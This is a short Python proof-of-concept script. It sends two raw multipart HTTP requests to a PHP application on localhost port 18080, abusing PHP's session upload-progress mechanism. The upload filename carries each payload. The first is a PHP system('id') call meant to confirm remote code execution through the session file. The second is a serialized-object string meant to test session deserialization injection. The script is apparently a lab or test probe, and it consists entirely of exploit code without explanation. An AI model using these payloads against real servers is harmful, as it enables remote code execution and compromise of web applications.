import socket

requests = [
    br"""POST /index.php HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: multipart/form-data; boundary=probe
Content-Length: 263
Connection: close

--probe
Content-Disposition: form-data; name="PHPSESSID"

probeb
--probe
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--probe
Content-Disposition: form-data; name="f"; filename="<?php system('id');echo 'RCE';?>"

Z
--probe--
""",
    br"""POST /index.php HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: multipart/form-data; boundary=probe
Content-Length: 254
Connection: close

--probe
Content-Disposition: form-data; name="PHPSESSID"

probec
--probe
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--probe
Content-Disposition: form-data; name="f"; filename="x|O:8:\"stdClass\":0:{}"

Z
--probe--
"""]

for request in requests:
    wire = request.replace(b"\n", b"\r\n")
    with socket.create_connection(("127.0.0.1", 18080)) as peer:
        peer.sendall(wire)
        print(peer.recv(4096))
